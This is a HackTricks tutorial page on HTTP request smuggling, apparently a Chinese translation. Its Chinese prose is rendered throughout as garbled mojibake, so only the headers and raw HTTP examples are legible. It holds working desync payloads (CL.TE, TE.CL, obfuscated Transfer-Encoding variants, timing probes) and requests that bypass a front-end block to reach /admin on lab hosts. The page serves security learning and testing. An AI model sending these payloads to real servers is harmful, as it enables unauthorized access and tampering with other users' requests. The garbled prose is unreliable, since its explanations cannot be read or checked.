# HTTP è¯·æ±‚ä¸²è¡Œæ”»å‡» / HTTP Desync æ”»å‡»

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä»€ä¹ˆæ˜¯

å½“**å‰ç«¯ä»£ç†**å’Œ**åç«¯**æœåŠ¡å™¨ä¹‹é—´å‘ç”Ÿ**ä¸åŒæ­¥**æ—¶ï¼Œä¼šå‡ºç°æ­¤æ¼æ´ï¼Œä½¿å¾—**æ”»å‡»è€…**èƒ½å¤Ÿå‘é€ä¸€ä¸ª HTTP **è¯·æ±‚**ï¼Œè¯¥è¯·æ±‚å°†è¢«**å‰ç«¯ä»£ç†**ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰è§£é‡Šä¸º**å•ä¸ªè¯·æ±‚**ï¼Œè€Œè¢«**åç«¯**æœåŠ¡å™¨è§£é‡Šä¸º**2ä¸ªè¯·æ±‚**ã€‚\
è¿™ä½¿å¾—ç”¨æˆ·èƒ½å¤Ÿåœ¨å…¶ä¹‹ååˆ°è¾¾åç«¯æœåŠ¡å™¨çš„**ä¸‹ä¸€ä¸ªè¯·æ±‚**ä¸­**ä¿®æ”¹è¯·æ±‚**ã€‚

### ç†è®º

[**RFC è§„èŒƒï¼ˆ2161ï¼‰**](https://tools.ietf.org/html/rfc2616)

> å¦‚æœæ¥æ”¶åˆ°çš„æ¶ˆæ¯åŒæ—¶å…·æœ‰ä¼ è¾“ç¼–ç å¤´å­—æ®µå’Œå†…å®¹é•¿åº¦å¤´å­—æ®µï¼Œåˆ™å¿…é¡»å¿½ç•¥åè€…ã€‚

**Content-Length**

> Content-Length å®ä½“å¤´æŒ‡ç¤ºå‘é€ç»™æ¥æ”¶æ–¹çš„å®ä½“ä¸»ä½“çš„å­—èŠ‚æ•°ã€‚

**Transfer-Encoding: chunked**

> Transfer-Encoding å¤´æŒ‡å®šç”¨äºå®‰å…¨ä¼ è¾“æœ‰æ•ˆè½½è·ä¸»ä½“çš„ç¼–ç å½¢å¼ã€‚\
> Chunked æ„å‘³ç€å¤§æ•°æ®ä»¥ä¸€ç³»åˆ—å—çš„å½¢å¼å‘é€

### ç°å®æƒ…å†µ

**å‰ç«¯**ï¼ˆè´Ÿè½½å‡è¡¡ / åå‘ä»£ç†ï¼‰å¤„ç† _**content-length**_ æˆ– _**transfer-encoding**_ å¤´ï¼Œè€Œ**åç«¯**æœåŠ¡å™¨å¤„ç†å¦ä¸€ä¸ªå¤´ï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªç³»ç»Ÿä¹‹é—´çš„**ä¸åŒæ­¥**ã€‚\
è¿™å¯èƒ½éå¸¸å±é™©ï¼Œå› ä¸º**æ”»å‡»è€…å°†èƒ½å¤Ÿå‘åå‘ä»£ç†å‘é€ä¸€ä¸ªè¯·æ±‚**ï¼Œè¯¥è¯·æ±‚å°†è¢«**åç«¯**æœåŠ¡å™¨è§£é‡Šä¸º**2ä¸ªä¸åŒçš„è¯·æ±‚**ã€‚è¿™ç§æŠ€æœ¯çš„å±é™©åœ¨äº**åç«¯**æœåŠ¡å™¨å°†ä¼šå°†**æ³¨å…¥çš„ç¬¬äºŒä¸ªè¯·æ±‚**è§£é‡Šä¸ºæ¥è‡ª**ä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯**ï¼Œè€Œè¯¥å®¢æˆ·ç«¯çš„**çœŸå®è¯·æ±‚**å°†æˆä¸º**æ³¨å…¥è¯·æ±‚**çš„ä¸€éƒ¨åˆ†ã€‚

### ç‰¹æ®Šæƒ…å†µ

è¯·è®°ä½ï¼Œåœ¨ HTTP ä¸­ï¼Œ**ä¸€ä¸ªæ¢è¡Œç¬¦ç”± 2 ä¸ªå­—èŠ‚ç»„æˆ**ï¼š

* **Content-Length**ï¼šæ­¤å¤´ä½¿ç”¨**åè¿›åˆ¶æ•°**æ¥æŒ‡ç¤ºè¯·æ±‚ä¸»ä½“çš„**å­—èŠ‚æ•°**ã€‚é¢„æœŸè¯·æ±‚ä¸»ä½“åœ¨æœ€åä¸€ä¸ªå­—ç¬¦ç»“æŸï¼Œ**è¯·æ±‚çš„æœ«å°¾ä¸éœ€è¦æ¢è¡Œç¬¦**ã€‚
* **Transfer-Encoding:** æ­¤å¤´åœ¨**ä¸»ä½“**ä¸­ä½¿ç”¨**åå…­è¿›åˆ¶æ•°**æ¥æŒ‡ç¤º**ä¸‹ä¸€ä¸ªå—**çš„**å­—èŠ‚æ•°**ã€‚**å—**å¿…é¡»ä»¥**æ¢è¡Œç¬¦**ç»“å°¾ï¼Œä½†æ˜¯**é•¿åº¦æŒ‡ç¤ºç¬¦ä¸è®¡ç®—**è¿™ä¸ªæ¢è¡Œç¬¦ã€‚æ­¤ä¼ è¾“æ–¹æ³•å¿…é¡»ä»¥**å¤§å°ä¸º 0 çš„å—åè·Ÿ 2 ä¸ªæ¢è¡Œç¬¦**ç»“æŸï¼š`0`
* **Connection**ï¼šæ ¹æ®æˆ‘çš„ç»éªŒï¼Œå»ºè®®åœ¨è¯·æ±‚ä¸²è¡Œçš„ç¬¬ä¸€ä¸ªè¯·æ±‚ä¸­ä½¿ç”¨**`Connection: keep-alive`**ã€‚

## åŸºæœ¬ç¤ºä¾‹

{% hint style="success" %}
å°è¯•ä½¿ç”¨ Burp Suite åˆ©ç”¨æ­¤æ¼æ´æ—¶ï¼Œ**åœ¨é‡å¤å™¨ä¸­ç¦ç”¨ `Update Content-Length` å’Œ `Normalize HTTP/1 line endings`**ï¼Œå› ä¸ºä¸€äº›å°å·¥å…·ä¼šæ»¥ç”¨æ¢è¡Œç¬¦ã€å›è½¦å’Œæ ¼å¼ä¸æ­£ç¡®çš„ content-lengthã€‚
{% endhint %}

HTTP è¯·æ±‚ä¸²è¡Œæ”»å‡»æ˜¯é€šè¿‡å‘é€æ¨¡æ£±ä¸¤å¯çš„è¯·æ±‚æ¥åˆ¶é€ çš„ï¼Œåˆ©ç”¨å‰ç«¯å’Œåç«¯æœåŠ¡å™¨è§£é‡Š `Content-Length`ï¼ˆCLï¼‰å’Œ `Transfer-Encoding`ï¼ˆTEï¼‰å¤´çš„å·®å¼‚ã€‚è¿™äº›æ”»å‡»å¯ä»¥ä»¥ä¸åŒå½¢å¼å‡ºç°ï¼Œä¸»è¦æ˜¯**CL.TE**ã€**TE.CL** å’Œ **TE.TE**ã€‚æ¯ç§ç±»å‹ä»£è¡¨å‰ç«¯å’Œåç«¯æœåŠ¡å™¨å¦‚ä½•ä¼˜å…ˆå¤„ç†è¿™äº›å¤´çš„ç‹¬ç‰¹ç»„åˆã€‚æ¼æ´æºäºæœåŠ¡å™¨ä»¥ä¸åŒæ–¹å¼å¤„ç†ç›¸åŒè¯·æ±‚ï¼Œå¯¼è‡´æ„å¤–ä¸”å¯èƒ½æ¶æ„çš„ç»“æœã€‚

### æ¼æ´ç±»å‹çš„åŸºæœ¬ç¤ºä¾‹

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE æ¼æ´ï¼ˆå‰ç«¯ä½¿ç”¨ Content-Lengthï¼Œåç«¯ä½¿ç”¨ Transfer-Encodingï¼‰

* **å‰ç«¯ï¼ˆCLï¼‰ï¼š** æ ¹æ® `Content-Length` å¤´å¤„ç†è¯·æ±‚ã€‚
* **åç«¯ï¼ˆTEï¼‰ï¼š** æ ¹æ® `Transfer-Encoding` å¤´å¤„ç†è¯·æ±‚ã€‚
* **æ”»å‡»åœºæ™¯ï¼š**
* æ”»å‡»è€…å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå…¶ä¸­ `Content-Length` å¤´çš„å€¼ä¸å®é™…å†…å®¹é•¿åº¦ä¸åŒ¹é…ã€‚
* å‰ç«¯æœåŠ¡å™¨æ ¹æ® `Content-Length` å€¼å°†æ•´ä¸ªè¯·æ±‚è½¬å‘ç»™åç«¯ã€‚
* åç«¯æœåŠ¡å™¨ç”±äº `Transfer-Encoding: chunked` å¤´è€Œå°†è¯·æ±‚å¤„ç†ä¸ºåˆ†å—ï¼Œå°†å‰©ä½™æ•°æ®è§£é‡Šä¸ºå•ç‹¬çš„ã€éšåçš„è¯·æ±‚ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL æ¼æ´ï¼ˆå‰ç«¯ä½¿ç”¨ Transfer-Encodingï¼Œåç«¯ä½¿ç”¨ Content-Lengthï¼‰

* **å‰ç«¯ï¼ˆTEï¼‰ï¼š** æ ¹æ® `Transfer-Encoding` å¤´å¤„ç†è¯·æ±‚ã€‚
* **åç«¯ï¼ˆCLï¼‰ï¼š** æ ¹æ® `Content-Length` å¤´å¤„ç†è¯·æ±‚ã€‚
* **æ”»å‡»åœºæ™¯ï¼š**
* æ”»å‡»è€…å‘é€ä¸€ä¸ªåˆ†å—è¯·æ±‚ï¼Œå…¶ä¸­å—å¤§å°ï¼ˆ`7b`ï¼‰å’Œå®é™…å†…å®¹é•¿åº¦ï¼ˆ`Content-Length: 4`ï¼‰ä¸å¯¹é½ã€‚
* å‰ç«¯æœåŠ¡å™¨éµå¾ª `Transfer-Encoding`ï¼Œå°†æ•´ä¸ªè¯·æ±‚è½¬å‘ç»™åç«¯ã€‚
* åç«¯æœåŠ¡å™¨éµå¾ª `Content-Length`ï¼Œä»…å¤„ç†è¯·æ±‚çš„åˆå§‹éƒ¨åˆ†ï¼ˆ`7b` å­—èŠ‚ï¼‰ï¼Œå°†å…¶ä½™éƒ¨åˆ†ä½œä¸ºæ„å¤–çš„éšåè¯·æ±‚çš„ä¸€éƒ¨åˆ†ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TEæ¼æ´ï¼ˆå‰ç«¯å’Œåç«¯éƒ½ä½¿ç”¨çš„ä¼ è¾“ç¼–ç ï¼Œå¸¦æœ‰æ··æ·†ï¼‰

* **æœåŠ¡å™¨ï¼š** ä¸¤è€…éƒ½æ”¯æŒ`Transfer-Encoding`ï¼Œä½†å¯ä»¥é€šè¿‡æ··æ·†æ¥æ¬ºéª—å…¶ä¸­ä¸€ä¸ªã€‚
* **æ”»å‡»åœºæ™¯ï¼š**
* æ”»å‡»è€…å‘é€å¸¦æœ‰æ··æ·†çš„`Transfer-Encoding`å¤´çš„è¯·æ±‚ã€‚
* å–å†³äºå“ªä¸ªæœåŠ¡å™¨ï¼ˆå‰ç«¯æˆ–åç«¯ï¼‰æ— æ³•è¯†åˆ«æ··æ·†ï¼Œå¯èƒ½ä¼šåˆ©ç”¨CL.TEæˆ–TE.CLæ¼æ´ã€‚
* è¯·æ±‚çš„æœªå¤„ç†éƒ¨åˆ†ï¼Œç”±å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨çœ‹åˆ°ï¼Œå°†æˆä¸ºåç»­è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œå¯¼è‡´èµ°ç§ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CLåœºæ™¯ï¼ˆå‰ç«¯å’Œåç«¯éƒ½ä½¿ç”¨çš„å†…å®¹é•¿åº¦ï¼‰ï¼š**

* ä¸¤ä¸ªæœåŠ¡å™¨ä»…åŸºäº`Content-Length`å¤´å¤„ç†è¯·æ±‚ã€‚
* è¿™ç§æƒ…å†µé€šå¸¸ä¸ä¼šå¯¼è‡´èµ°ç§ï¼Œå› ä¸ºä¸¤ä¸ªæœåŠ¡å™¨åœ¨è§£é‡Šè¯·æ±‚é•¿åº¦æ–¹é¢æ˜¯ä¸€è‡´çš„ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

æ­£å¸¸è¯·æ±‚
```

#### **CL != 0åœºæ™¯ï¼š**

* æŒ‡çš„æ˜¯`Content-Length`å¤´å­˜åœ¨ä¸”å€¼ä¸ä¸ºé›¶çš„æƒ…å†µï¼Œè¡¨æ˜è¯·æ±‚ä½“å…·æœ‰å†…å®¹ã€‚
* åœ¨ç†è§£å’Œæ„å»ºèµ°ç§æ”»å‡»æ—¶è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒå½±å“æœåŠ¡å™¨å¦‚ä½•ç¡®å®šè¯·æ±‚çš„ç»“æŸã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

éç©ºè¯·æ±‚ä½“
```

#### ç ´åWebæœåŠ¡å™¨

è¿™ç§æŠ€æœ¯åœ¨**è¯»å–åˆå§‹HTTPæ•°æ®æ—¶å¯èƒ½ç ´åWebæœåŠ¡å™¨**ï¼Œä½†**ä¸å…³é—­è¿æ¥**çš„æƒ…å†µä¸‹ä¹Ÿå¾ˆæœ‰ç”¨ã€‚è¿™æ ·ï¼ŒHTTPè¯·æ±‚çš„**ä¸»ä½“**å°†è¢«è§†ä¸º**ä¸‹ä¸€ä¸ªHTTPè¯·æ±‚**ã€‚

ä¾‹å¦‚ï¼Œæ­£å¦‚åœ¨[**è¿™ç¯‡æ–‡ç« **](https://mizu.re/post/twisty-python)ä¸­æ‰€è§£é‡Šçš„ï¼Œåœ¨Werkzeugä¸­ï¼Œå‘é€ä¸€äº›**Unicode**å­—ç¬¦å¯èƒ½å¯¼è‡´æœåŠ¡å™¨**å´©æºƒ**ã€‚ä½†æ˜¯ï¼Œå¦‚æœä½¿ç”¨å¸¦æœ‰å¤´éƒ¨**`Connection: keep-alive`**åˆ›å»ºHTTPè¿æ¥ï¼Œåˆ™ä¸ä¼šè¯»å–è¯·æ±‚çš„ä¸»ä½“ï¼Œè¿æ¥ä»å°†ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œå› æ­¤è¯·æ±‚çš„**ä¸»ä½“**å°†è¢«è§†ä¸º**ä¸‹ä¸€ä¸ªHTTPè¯·æ±‚**ã€‚

#### é€šè¿‡é€è·³å¤´å¼ºåˆ¶

æ»¥ç”¨é€è·³å¤´ï¼Œæ‚¨å¯ä»¥æŒ‡ç¤ºä»£ç†**åˆ é™¤æ ‡é¢˜Content-Lengthæˆ–Transfer-Encodingï¼Œä»¥ä¾¿æ»¥ç”¨HTTPè¯·æ±‚èµ°ç§**ã€‚
```
Connection: Content-Length
```
## å¯»æ‰¾HTTPè¯·æ±‚èµ°ç§

é€šè¿‡è§‚å¯ŸæœåŠ¡å™¨å¯¹æ“çºµè¯·æ±‚çš„å“åº”æ—¶é—´æ¥è¯†åˆ«HTTPè¯·æ±‚èµ°ç§æ¼æ´é€šå¸¸æ˜¯å¯è¡Œçš„ï¼Œè¿™ä¾èµ–äºæ—¶é—´æŠ€æœ¯ã€‚è¿™äº›æŠ€æœ¯å¯¹äºæ£€æµ‹CL.TEå’ŒTE.CLæ¼æ´ç‰¹åˆ«æœ‰ç”¨ã€‚é™¤äº†è¿™äº›æ–¹æ³•ï¼Œè¿˜æœ‰å…¶ä»–ç­–ç•¥å’Œå·¥å…·å¯ç”¨äºå‘ç°æ­¤ç±»æ¼æ´ï¼š

### ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾CL.TEæ¼æ´

* **æ–¹æ³•:**
* å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œå°†å¯¼è‡´åç«¯æœåŠ¡å™¨ç­‰å¾…é¢å¤–æ•°æ®ã€‚
*   **ç¤ºä¾‹:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **è§‚å¯Ÿ:**
* å‰ç«¯æœåŠ¡å™¨æ ¹æ®`Content-Length`å¤„ç†è¯·æ±‚ï¼Œå¹¶è¿‡æ—©æˆªæ–­æ¶ˆæ¯ã€‚
* åç«¯æœåŠ¡å™¨æœŸæœ›æ”¶åˆ°ä¸€ä¸ªåˆ†å—æ¶ˆæ¯ï¼Œç­‰å¾…ä¸‹ä¸€ä¸ªä»æœªåˆ°è¾¾çš„åˆ†å—ï¼Œå¯¼è‡´å»¶è¿Ÿã€‚
* **æŒ‡æ ‡:**
* å“åº”è¶…æ—¶æˆ–é•¿æ—¶é—´å»¶è¿Ÿã€‚
* ä»åç«¯æœåŠ¡å™¨æ¥æ”¶åˆ°400 Bad Requesté”™è¯¯ï¼Œæœ‰æ—¶è¿˜é™„å¸¦è¯¦ç»†çš„æœåŠ¡å™¨ä¿¡æ¯ã€‚

### ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾TE.CLæ¼æ´

* **æ–¹æ³•:**
* å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œå°†å¯¼è‡´åç«¯æœåŠ¡å™¨ç­‰å¾…é¢å¤–æ•°æ®ã€‚
*   **ç¤ºä¾‹:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **è§‚å¯Ÿ:**
* å‰ç«¯æœåŠ¡å™¨æ ¹æ®`Transfer-Encoding`å¤„ç†è¯·æ±‚å¹¶è½¬å‘æ•´ä¸ªæ¶ˆæ¯ã€‚
* åç«¯æœåŠ¡å™¨æœŸæœ›åŸºäº`Content-Length`çš„æ¶ˆæ¯ï¼Œç­‰å¾…ä»æœªåˆ°è¾¾çš„é¢å¤–æ•°æ®ï¼Œå¯¼è‡´å»¶è¿Ÿã€‚

### å…¶ä»–æŸ¥æ‰¾æ¼æ´çš„æ–¹æ³•

* **å·®å¼‚å“åº”åˆ†æ:**
* å‘é€ç•¥æœ‰å˜åŒ–çš„è¯·æ±‚ç‰ˆæœ¬ï¼Œå¹¶è§‚å¯ŸæœåŠ¡å™¨å“åº”æ˜¯å¦ä»¥æ„å¤–æ–¹å¼ä¸åŒï¼ŒæŒ‡ç¤ºè§£æå·®å¼‚ã€‚
* **ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·:**
* åƒBurp Suiteçš„'HTTP Request Smuggler'æ‰©å±•è¿™æ ·çš„å·¥å…·å¯ä»¥é€šè¿‡å‘é€å„ç§æ¨¡ç³Šè¯·æ±‚å¹¶åˆ†æå“åº”æ¥è‡ªåŠ¨æµ‹è¯•è¿™äº›æ¼æ´ã€‚
* **Content-Lengthå˜åŒ–æµ‹è¯•:**
* å‘é€å…·æœ‰ä¸ä¸å®é™…å†…å®¹é•¿åº¦å¯¹é½çš„ä¸åŒ`Content-Length`å€¼çš„è¯·æ±‚ï¼Œå¹¶è§‚å¯ŸæœåŠ¡å™¨å¦‚ä½•å¤„ç†è¿™ç§ä¸åŒ¹é…ã€‚
* **Transfer-Encodingå˜åŒ–æµ‹è¯•:**
* å‘é€å…·æœ‰æ··æ·†æˆ–æ ¼å¼ä¸æ­£ç¡®çš„`Transfer-Encoding`å¤´çš„è¯·æ±‚ï¼Œå¹¶ç›‘è§†å‰ç«¯å’Œåç«¯æœåŠ¡å™¨å¯¹è¿™ç§æ“çºµçš„ä¸åŒå“åº”ã€‚

### HTTPè¯·æ±‚èµ°ç§æ¼æ´æµ‹è¯•

åœ¨ç¡®è®¤æ—¶é—´æŠ€æœ¯çš„æœ‰æ•ˆæ€§åï¼ŒéªŒè¯å®¢æˆ·ç«¯è¯·æ±‚æ˜¯å¦å¯è¢«æ“çºµè‡³å…³é‡è¦ã€‚ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯å°è¯•æ“çºµæ‚¨çš„è¯·æ±‚ï¼Œä¾‹å¦‚ï¼Œä½¿å¯¹`/`çš„è¯·æ±‚äº§ç”Ÿ404å“åº”ã€‚åœ¨[åŸºæœ¬ç¤ºä¾‹](./#basic-examples)ä¸­å…ˆå‰è®¨è®ºçš„`CL.TE`å’Œ`TE.CL`ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•æ“çºµå®¢æˆ·ç«¯è¯·æ±‚ä»¥å¼•å‘404å“åº”ï¼Œå°½ç®¡å®¢æˆ·ç«¯çš„ç›®æ ‡æ˜¯è®¿é—®ä¸åŒçš„èµ„æºã€‚

**å…³é”®è€ƒè™‘äº‹é¡¹**

åœ¨é€šè¿‡å¹²æ‰°å…¶ä»–è¯·æ±‚æµ‹è¯•è¯·æ±‚èµ°ç§æ¼æ´æ—¶ï¼Œè¯·è®°ä½ï¼š

* **ä¸åŒçš„ç½‘ç»œè¿æ¥:** â€œæ”»å‡»â€å’Œâ€œæ­£å¸¸â€è¯·æ±‚åº”åˆ†åˆ«é€šè¿‡ä¸åŒçš„ç½‘ç»œè¿æ¥å‘é€ã€‚ä½¿ç”¨ç›¸åŒè¿æ¥å‘é€ä¸¤è€…ä¸ä¼šéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
* **ä¸€è‡´çš„URLå’Œå‚æ•°:** åŠ¡å¿…ä¸ºä¸¤ä¸ªè¯·æ±‚ä½¿ç”¨ç›¸åŒçš„URLå’Œå‚æ•°åç§°ã€‚ç°ä»£åº”ç”¨ç¨‹åºé€šå¸¸æ ¹æ®URLå’Œå‚æ•°å°†è¯·æ±‚è·¯ç”±åˆ°ç‰¹å®šçš„åç«¯æœåŠ¡å™¨ã€‚åŒ¹é…è¿™äº›å†…å®¹å¢åŠ äº†ä¸¤ä¸ªè¯·æ±‚ç”±åŒä¸€æœåŠ¡å™¨å¤„ç†çš„å¯èƒ½æ€§ï¼Œè¿™æ˜¯æˆåŠŸæ”»å‡»çš„å…ˆå†³æ¡ä»¶ã€‚
* **æ—¶é—´å’Œç«äº‰æ¡ä»¶:** â€œæ­£å¸¸â€è¯·æ±‚æ—¨åœ¨æ£€æµ‹æ¥è‡ªâ€œæ”»å‡»â€è¯·æ±‚çš„å¹²æ‰°ï¼Œä¸å…¶ä»–å¹¶å‘åº”ç”¨ç¨‹åºè¯·æ±‚ç«äº‰ã€‚å› æ­¤ï¼Œåº”ç«‹å³åœ¨â€œæ”»å‡»â€è¯·æ±‚ä¹‹åå‘é€â€œæ­£å¸¸â€è¯·æ±‚ã€‚ç¹å¿™çš„åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æ‰èƒ½å¾—å‡ºç»“è®ºæ€§çš„æ¼æ´ç¡®è®¤ã€‚
* **è´Ÿè½½å‡è¡¡æŒ‘æˆ˜:** å……å½“è´Ÿè½½å‡è¡¡å™¨çš„å‰ç«¯æœåŠ¡å™¨å¯èƒ½ä¼šå°†è¯·æ±‚åˆ†å‘åˆ°å„ç§åç«¯ç³»ç»Ÿã€‚å¦‚æœâ€œæ”»å‡»â€å’Œâ€œæ­£å¸¸â€è¯·æ±‚æœ€ç»ˆè¿›å…¥ä¸åŒçš„ç³»ç»Ÿï¼Œæ”»å‡»å°†ä¸ä¼šæˆåŠŸã€‚è¿™ç§è´Ÿè½½å¹³è¡¡æ–¹é¢å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æ‰èƒ½ç¡®è®¤æ¼æ´ã€‚
* **æ„å¤–ç”¨æˆ·å½±å“:** å¦‚æœæ‚¨çš„æ”»å‡»æ„å¤–å½±å“äº†å¦ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ï¼ˆè€Œä¸æ˜¯æ‚¨å‘é€ç”¨äºæ£€æµ‹çš„â€œæ­£å¸¸â€è¯·æ±‚ï¼‰ï¼Œè¿™è¡¨æ˜æ‚¨çš„æ”»å‡»å½±å“äº†å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºç”¨æˆ·ã€‚æŒç»­æµ‹è¯•å¯èƒ½ä¼šå¹²æ‰°å…¶ä»–ç”¨æˆ·ï¼Œéœ€è¦è°¨æ…å¤„ç†ã€‚

## æ»¥ç”¨HTTPè¯·æ±‚èµ°ç§

### é€šè¿‡HTTPè¯·æ±‚èµ°ç§ç»•è¿‡å‰ç«¯å®‰å…¨

æœ‰æ—¶ï¼Œå‰ç«¯ä»£ç†å®æ–½å®‰å…¨æªæ–½ï¼Œå®¡æŸ¥ä¼ å…¥è¯·æ±‚ã€‚ç„¶è€Œï¼Œè¿™äº›æªæ–½å¯ä»¥é€šè¿‡åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ¥ç»•è¿‡ï¼Œä»è€Œå…è®¸æœªç»æˆæƒè®¿é—®å—é™ç«¯ç‚¹ã€‚ä¾‹å¦‚ï¼Œå¤–éƒ¨å¯èƒ½ç¦æ­¢è®¿é—®`/admin`ï¼Œå‰ç«¯ä»£ç†ä¼šä¸»åŠ¨é˜»æ­¢æ­¤ç±»å°è¯•ã€‚ç„¶è€Œï¼Œè¯¥ä»£ç†å¯èƒ½å¿½ç•¥æ£€æŸ¥èµ°ç§HTTPè¯·æ±‚ä¸­åµŒå…¥çš„è¯·æ±‚ï¼Œä¸ºç»•è¿‡è¿™äº›é™åˆ¶ç•™ä¸‹æ¼æ´ã€‚

è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼Œè¯´æ˜å¦‚ä½•ä½¿ç”¨HTTPè¯·æ±‚èµ°ç§ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹é€šå¸¸ç”±å‰ç«¯ä»£ç†ä¿æŠ¤çš„`/admin`è·¯å¾„ï¼š

**CL.TEç¤ºä¾‹**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
åœ¨ CL.TE æ”»å‡»ä¸­ï¼Œåˆ©ç”¨ `Content-Length` å¤´éƒ¨è¿›è¡Œåˆå§‹è¯·æ±‚ï¼Œè€ŒéšååµŒå…¥çš„è¯·æ±‚åˆ™åˆ©ç”¨ `Transfer-Encoding: chunked` å¤´éƒ¨ã€‚å‰ç«¯ä»£ç†å¤„ç†åˆå§‹çš„ `POST` è¯·æ±‚ï¼Œä½†æœªèƒ½æ£€æŸ¥åµŒå…¥çš„ `GET /admin` è¯·æ±‚ï¼Œä»è€Œå…è®¸æœªç»æˆæƒè®¿é—® `/admin` è·¯å¾„ã€‚

**TE.CL ç¤ºä¾‹**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
